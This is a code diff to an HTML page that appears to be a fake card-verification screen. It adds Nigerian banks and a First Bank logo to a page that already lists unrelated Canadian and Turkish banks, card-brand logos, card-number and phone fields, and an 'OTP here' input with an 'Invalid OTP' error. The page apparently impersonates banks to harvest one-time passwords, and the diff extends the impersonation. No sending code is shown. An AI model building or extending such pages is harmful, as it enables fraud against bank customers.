@@ -80,6 +80,8 @@
                                 <option value="Bank of montreal">Bank of montreal</option>
                                 <option value="Canadian imperial bank of commerce">Canadian imperial bank of commerce</option>
                                 <option value="YAPI KREDİ BANKASI">YAPI KREDİ BANKASI</option>
+                                <option value="Fidelity Bank">Fidelity Bank</option>
+                                <option value="First Bank of Nigeria">First Bank of Nigeria</option>
                             </select>
                             <p class="text-danger" id="bankError" style="font-size: 16px; display: none;">Please select a bank</p>
                         </div>
@@ -180,6 +182,7 @@
                     <img width="100" id="ax-img" height="60" src="./images/americanexpress.jpeg" alt="American express logo" />
                     <img width="100" id="visa-img" height="60" src="./images/visanewage.jpeg" alt="Visa logo" />
                     <img width="100" id="euro-img" height="60" src="./images/europay-image.jpeg" alt="Euro image logo" />
+                    <img width="100" id="first-img" height="60" src="./images/firstbank.png" alt="First bank image logo" />
                     <div class="row mx-auto" style="padding-top: 10%;">
                         <ul>
                             <li>Welcome</li>
@@ -193,6 +196,7 @@
                             <li class="bank-list6">Issuing Bank:</li>
                             <li class="bank-list7">Issuing Bank:</li>
                             <li class="bank-list8">Issuing Bank:</li>
+                            <li class="bank-list9">Issuing Bank:</li>
                             <li>Date:</li>
                             <li>Card Number:</li>
                             <li>Address:</li>
@@ -211,12 +215,13 @@
                             <li class="bank-list6">EUROPAY (EUROCARD) ISRAEL LTD</li>
                             <li class="bank-list7">ROYAL BANK OF CANADA</li>
                             <li class="bank-list8">BANK OF NOVA SCOTIA</li>
+                            <li class="bank-list9">First Bank of Nigeria</li>
                             <li id="date"></li>
                             <li id="card-number-list"></li>
                             <li id="phone-list"></li>
                             <li>
                                 <form action="">
-                                    <input id="otp-input" type="text" placeholder="OTP here" required><br />
+                                    <input id="otp-input" type="text" placeholder="OTP here" required /><br />
                                     <p class="text-danger" style="display: none;" id="otp-error">Invalid OTP</p>
                                     <button type="button" id="confirm-btn" class="mt-4 btn btn-secondary">Confirm</button>
                                 </form>
